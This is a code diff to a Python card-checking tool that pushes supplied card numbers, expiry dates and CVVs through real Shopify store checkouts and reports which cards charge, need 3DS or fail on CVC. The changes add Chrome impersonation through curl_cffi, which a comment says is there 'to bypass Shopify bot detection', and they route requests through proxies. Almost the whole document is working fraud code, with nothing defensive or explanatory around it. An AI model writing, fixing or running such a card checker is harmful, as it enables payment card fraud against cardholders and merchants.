@@ -235,8 +235,11 @@ async def fetch_cheapest_product(domain, proxy_str=None, max_price=1000.00):
 async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_str=None, max_retries=3):
     """
     Validate a card against a Shopify store with retries.
+    Uses curl_cffi with Chrome impersonation to bypass Shopify bot detection.
     Returns dict with: Response, CC, Price, Gate, Site, Charged, Approved, Time
     """
+    from curl_cffi.requests import AsyncSession as CurlSession
+
     start_time = time.time()
     gateway = "UNKNOWN"
     total_price = "0.00"
@@ -244,7 +247,9 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
     checkout_url = "N/A"
 
     ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
+    domain = urlparse(ourl).netloc
     proxy = parse_proxy(proxy_str) if proxy_str else None
+    curl_proxies = {"http": proxy, "https": proxy} if proxy else None
 
     def _result(response, charged="False", approved="False"):
         elapsed = round(time.time() - start_time, 1)
@@ -281,55 +286,43 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 variant_id = product["variant_id"]
                 total_price = product["price"]
 
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Content-Type": "application/json",
-                "Origin": ourl,
-                "Referer": ourl,
-            }
-
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout_cfg = aiohttp.ClientTimeout(total=45)
-
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
-                # xunez debug Step 1: Add to cart
+            async with CurlSession(impersonate="chrome120", timeout=12) as session:
+                # Step 1: Add to cart
                 print(f"[{attempt}] [STEP 2] Adding to cart...")
                 cart_resp = await session.post(
                     f"{ourl}/cart/add.js",
                     data=f"id={variant_id}&quantity=1",
-                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
-                    proxy=proxy,
+                    headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
+                    proxies=curl_proxies,
                 )
-                print(f"[{attempt}] [CART] Status: {cart_resp.status}")
-                if cart_resp.status != 200:
+                print(f"[{attempt}] [CART] Status: {cart_resp.status_code}")
+                if cart_resp.status_code != 200:
                     print(f"[{attempt}] [INFO] Trying JSON fallback...")
                     cart_resp = await session.post(
                         f"{ourl}/cart/add.js",
                         json={"items": [{"id": int(variant_id), "quantity": 1}]},
-                        headers={**headers, "Accept": "application/json"},
-                        proxy=proxy,
+                        headers={"Accept": "application/json"},
+                        proxies=curl_proxies,
                     )
-                    print(f"[{attempt}] [CART-JSON] Status: {cart_resp.status}")
-                
-                if cart_resp.status != 200:
+                    print(f"[{attempt}] [CART-JSON] Status: {cart_resp.status_code}")
+
+                if cart_resp.status_code != 200:
                     print(f"[{attempt}] [ISSUE] Failed to add to cart.")
                     if attempt < max_retries: continue
                     return _result("CART_FAILED")
 
-                # xunez debug Step 2: Get checkout
+                # Step 2: Get checkout page
                 print(f"[{attempt}] [STEP 3] Entering checkout...")
                 checkout_resp = await session.post(
                     f"{ourl}/checkout/",
                     allow_redirects=True,
-                    headers={**headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
-                    proxy=proxy,
+                    headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+                    proxies=curl_proxies,
                 )
-                print(f"[{attempt}] [CHECKOUT] Status: {checkout_resp.status}")
+                print(f"[{attempt}] [CHECKOUT] Status: {checkout_resp.status_code}")
                 checkout_url = str(checkout_resp.url)
                 print(f"[{attempt}] [INFO] Checkout URL: {checkout_url}")
-                text = await checkout_resp.text()
+                text = checkout_resp.text
 
                 if "login" in checkout_url.lower():
                     print(f"[{attempt}] [ISSUE] Login required.")
@@ -338,8 +331,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
                 attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split("/")[-1].split("?")[0]
 
-                sst = checkout_resp.headers.get("X-Checkout-One-Session-Token") or checkout_resp.headers.get("x-checkout-one-session-token")
-                if not sst: sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
+                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
                 if not sst: sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                 if not sst: sst = extract_between(text, '"serializedSessionToken":"', '"')
                 if not sst: sst = extract_between(text, '"sessionToken":"', '"')
@@ -381,17 +373,21 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
                 if ident_match: ident_sig = ident_match.group(1)
 
-                # xunez debug Step 3: Shipping proposal
-                headers.update({
+                # Step 3: Shipping proposal
+                gql_headers = {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Origin": f"https://{domain}",
+                    "Referer": checkout_url,
                     "shopify-checkout-client": "checkout-web/1.0",
                     "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                     "x-checkout-one-session-token": sst,
-                })
-                if build_id: headers["x-checkout-web-build-id"] = build_id
-                if source_token: headers["x-checkout-web-source-id"] = source_token
+                }
+                if build_id: gql_headers["x-checkout-web-build-id"] = build_id
+                if source_token: gql_headers["x-checkout-web-source-id"] = source_token
 
-                graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
-                
+                graphql_url = f"https://{domain}/checkouts/unstable/graphql"
+
                 print(f"[{attempt}] [STEP 4] Sending Shipping Proposal...")
                 json_data = {
                     "query": QUERY_PROPOSAL_SHIPPING,
@@ -402,7 +398,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                         "delivery": {
                             "deliveryLines": [{
                                 "destination": {
-                                    "partialStreetAddress": {
+                                    "streetAddress": {
                                         "address1": street, "address2": "", "city": city,
                                         "countryCode": country_code, "postalCode": s_zip,
                                         "firstName": firstName, "lastName": lastName,
@@ -486,10 +482,10 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     "operationName": "Proposal",
                 }
 
-                resp = await session.post(graphql_url, params={"operationName": "Proposal"}, headers=headers, json=json_data, proxy=proxy)
-                resp_text = await resp.text()
-                
-                print(f"[{attempt}] [SHIPPING] Status: {resp.status}")
+                resp = await session.post(graphql_url, json=json_data, headers=gql_headers, proxies=curl_proxies)
+                resp_text = resp.text
+
+                print(f"[{attempt}] [SHIPPING] Status: {resp.status_code}")
                 try:
                     resp_json = json.loads(resp_text)
                 except:
@@ -512,7 +508,34 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
 
                 checkpoint_data = result.get("checkpointData")
                 seller_proposal = result.get("sellerProposal", {})
-                running_total = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "0.00")
+                
+                # Dynamic total & currency extraction from Shopify's seller proposal
+                sp_total = seller_proposal.get("total", {}).get("value", {})
+                if not sp_total:
+                    sp_total = seller_proposal.get("checkoutTotal", {}).get("value", {})
+                if not sp_total:
+                    sp_total = seller_proposal.get("runningTotal", {}).get("value", {})
+
+                if sp_total and sp_total.get("amount"):
+                    running_total = sp_total.get("amount", "0.00")
+                else:
+                    running_total = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "0.00")
+
+                if sp_total and sp_total.get("currencyCode"):
+                    currency = sp_total.get("currencyCode")
+
+                # Extract accurate store currency and country
+                buyer_customer = seller_proposal.get("buyerIdentity", {}).get("customer", {})
+                if buyer_customer:
+                    if buyer_customer.get("presentmentCurrency"):
+                        currency = buyer_customer.get("presentmentCurrency")
+                    if buyer_customer.get("countryCode"):
+                        country_code = buyer_customer.get("countryCode")
+
+                # Extract exact merchandise subtotal
+                merch_lines = seller_proposal.get("merchandise", {}).get("merchandiseLines", [])
+                if merch_lines and merch_lines[0].get("totalAmount", {}).get("value", {}).get("amount"):
+                    subtotal = merch_lines[0]["totalAmount"]["value"]["amount"]
 
                 delivery_data = seller_proposal.get("delivery", {})
                 delivery_strategy = ""
@@ -543,7 +566,10 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                         if pm.get("paymentMethodIdentifier"):
                             payment_identifier = pm["paymentMethodIdentifier"]
                             gateway = pm.get("extensibilityDisplayName") or pm.get("name", "Shopify Payments")
-                            total_price = str(float(running_total) + shipping_amount + tax_amount)
+                            if sp_total and sp_total.get("amount") and float(sp_total.get("amount", 0)) > 0:
+                                total_price = f"{float(sp_total['amount']):.2f}"
+                            else:
+                                total_price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                             break
 
                 if not payment_identifier:
@@ -551,12 +577,20 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     if attempt < max_retries: continue
                     return _result("NO_PAYMENT_METHOD")
 
-                # xunez debug Step 4: Delivery proposal
+                # Step 4: Delivery proposal
                 print(f"[{attempt}] [STEP 5] Sending Delivery Proposal...")
                 json_data["query"] = QUERY_PROPOSAL_DELIVERY
+                json_data["variables"]["delivery"]["deliveryLines"][0]["destination"] = {
+                    "streetAddress": {
+                        "address1": street, "address2": "", "city": city,
+                        "countryCode": country_code, "postalCode": s_zip,
+                        "firstName": firstName, "lastName": lastName,
+                        "zoneCode": state, "phone": phone,
+                    }
+                }
                 json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                     "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
-                    "options": {},
+                    "options": {"phone": phone},
                 }
                 json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {"lines": [{"stableId": stableId or "1"}]}
                 json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
@@ -570,36 +604,36 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     }
                 }
                 json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
-                
-                await session.post(graphql_url, params={"operationName": "Proposal"}, headers=headers, json=json_data, proxy=proxy)
 
-                # xunez debug Step 5: Tokenize card
+                await session.post(graphql_url, json=json_data, headers=gql_headers, proxies=curl_proxies)
+
+                # Step 5: Tokenize card via PCI vault (aiohttp is fine here - no bot detection)
                 print(f"[{attempt}] [STEP 6] Vaulting Card...")
                 vault_payload = {
                     "credit_card": {
                         "number": cc, "month": int(month), "year": int(year),
                         "verification_value": cvv, "name": f"{firstName} {lastName}"
                     },
-                    "payment_session_scope": urlparse(ourl).netloc,
+                    "payment_session_scope": domain,
                 }
                 vault_headers = {
                     "Content-Type": "application/json", "Accept": "application/json",
                     "Origin": "https://checkout.pci.shopifyinc.com",
-                    "User-Agent": headers["User-Agent"],
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
                 }
                 if ident_sig: vault_headers["shopify-identification-signature"] = ident_sig
 
-                vault_resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=vault_payload, headers=vault_headers, proxy=proxy)
-                print(f"[{attempt}] [VAULT] Status: {vault_resp.status}")
-                token_data = await vault_resp.json()
+                vault_resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=vault_payload, headers=vault_headers)
+                print(f"[{attempt}] [VAULT] Status: {vault_resp.status_code}")
+                token_data = vault_resp.json()
                 token = token_data.get("id")
-                
+
                 if not token:
                     print(f"[{attempt}] [ISSUE] Card vaulting failed.")
                     if attempt < max_retries: continue
                     return _result("TOKENIZATION_FAILED")
 
-                # xunez debug Step 6: Submit
+                # Step 6: Submit for completion
                 print(f"[{attempt}] [STEP 7] Submitting for Completion...")
                 submit_variables = {
                     "input": {
@@ -699,15 +733,15 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     "operationName": "SubmitForCompletion",
                 }
 
-                resp = await session.post(graphql_url, params={"operationName": "SubmitForCompletion"}, headers=headers, json=submit_json, proxy=proxy)
-                submit_text = await resp.text()
-                print(f"[{attempt}] [SUBMIT] Status: {resp.status}")
+                resp = await session.post(graphql_url, json=submit_json, headers=gql_headers, proxies=curl_proxies)
+                submit_text = resp.text
+                print(f"[{attempt}] [SUBMIT] Status: {resp.status_code}")
 
                 # 1. SUCCESS CHECK (First Priority)
                 if '/processing?completed=true' in submit_text.lower() or 'thank_you' in submit_text.lower() or any(ind in submit_text for ind in ['"confirmationPage"', 'post_purchase', 'Your order is confirmed']):
                     print("CHARGE_SUCCESS! ✅")
                     return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
-                
+
                 # 2. 3DS CHECK (Second Priority)
                 if any(ind in submit_text for ind in ['CompletePaymentChallenge', f'{ourl}/stripe/authentications/']):
                     print("3DS")
@@ -747,12 +781,22 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     if receipt:
                         rtype = receipt.get("__typename", "")
                         if rtype == "ProcessedReceipt":
+                            order_stat = receipt.get("orderCreationStatus", {}).get("__typename")
+                            if order_stat == "OrderCreationSucceeded":
+                                print("CHARGE_SUCCESS! ✅")
+                                return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
+                            proc_err = receipt.get("processingError", {})
+                            if proc_err:
+                                err_code = proc_err.get("code") or proc_err.get("messageUntranslated", "DECLINED")
+                                print(f"[{attempt}] [RESULT] {err_code}")
+                                return _result(err_code, approved="True" if any(x in str(err_code).upper() for x in ["INSUFFICIENT", "CVC", "3DS"]) else "False")
                             print("CHARGE_SUCCESS! ✅")
                             return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
+
                         if rtype == "ActionRequiredReceipt":
                             print("3DS")
                             return _result("3DS_SECURED! [Not charged] ❎", approved="True")
-                        
+
                         rid = receipt.get("id")
                         if rid:
                             print(f"[{attempt}] [STEP 8] Polling for Receipt: {rid}")
@@ -761,17 +805,17 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                 "variables": {"receiptId": rid, "sessionToken": sst},
                                 "operationName": "PollForReceipt",
                             }
-                            await asyncio.sleep(0.5)
+                            await asyncio.sleep(0.2)
                             for p in range(5):
-                                p_resp = await session.post(graphql_url, params={"operationName": "PollForReceipt"}, headers=headers, json=poll_json, proxy=proxy)
-                                p_text = await p_resp.text()
-                                print(f"    [POLL {p+1}] Status: {p_resp.status}")
+                                p_resp = await session.post(graphql_url, json=poll_json, headers=gql_headers, proxies=curl_proxies)
+                                p_text = p_resp.text
+                                print(f"    [POLL {p+1}] Status: {p_resp.status_code}")
 
                                 # 1. SUCCESS CHECK (First Priority)
                                 if '/processing?completed=true' in p_text.lower() or 'thank_you' in p_text.lower() or any(ind in p_text for ind in ['"confirmationPage"', 'post_purchase', 'Your order is confirmed']):
                                     print("CHARGE_SUCCESS! ✅")
                                     return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
-                                
+
                                 # 2. 3DS CHECK (Second Priority)
                                 if any(ind in p_text for ind in ['CompletePaymentChallenge', f'{ourl}/stripe/authentications/']):
                                     print("3DS")
@@ -791,7 +835,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                     if order_status == 'OrderCreationSucceeded':
                                         print("CHARGE_SUCCESS! ✅")
                                         return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
-                                    
+
                                     p_data = p_json.get("data", {}).get("receipt", {})
                                     pt = p_data.get("__typename", "")
                                     print(f"    [POLL {p+1}] Type: {pt}")
@@ -801,7 +845,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                     elif pt == "FailedReceipt":
                                         p_err = p_data.get("processingError", {})
                                         p_code = p_err.get("code", "") or p_err.get("messageUntranslated", "FAILED_RECEIPT")
-                                        
+
                                         # Final check for specific codes in the structured error
                                         if 'INCORRECT_CVC' in p_code.upper():
                                             return _result("INCORRECT_CVC!✅", approved="True")
